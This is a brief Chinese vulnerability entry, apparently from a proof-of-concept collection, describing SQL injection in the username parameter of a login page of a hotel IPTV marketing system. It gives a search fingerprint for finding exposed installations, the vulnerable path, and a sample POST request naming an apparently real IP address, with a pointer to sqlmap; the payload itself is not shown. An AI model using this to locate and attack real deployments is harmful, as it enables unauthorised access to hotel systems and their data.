# 深圳市子辰视讯科技有限公司酒店智慧营销IPTV系统存在sql注入

- **系统**：深圳市子辰视讯科技有限公司酒店智慧营销IPTV系统　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`"登录 - 酒店智慧营销IPTV系统"`
- **请求**：`POST /xsiptva/cniptv/userlogin.php HTTP/1.1`

**请求体 / payload**
```
漏洞位置：
/xsiptva/cniptv/userlogin.php

登录界面存在sql注入，username参数sql注入漏洞
Host: xx.xx.xx.xx
Content-Type: application/x-www-form-urlencoded
Content-Length: 29
Origin: http://1.69.37.165:8880
Referer: http://1.69.37.165:8880/xsiptva/cniptv/userlogin.php
Cookie: PHPSESSID=8kvgnj6bg3vr7ljf12c861s3i4
username=admin&password=admin
sqlmap\
```

**其他**
- 深圳市子辰视讯科技有限公司酒店智慧营销IPTV系统存在sql注入: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 酒店智慧营销IPTV系统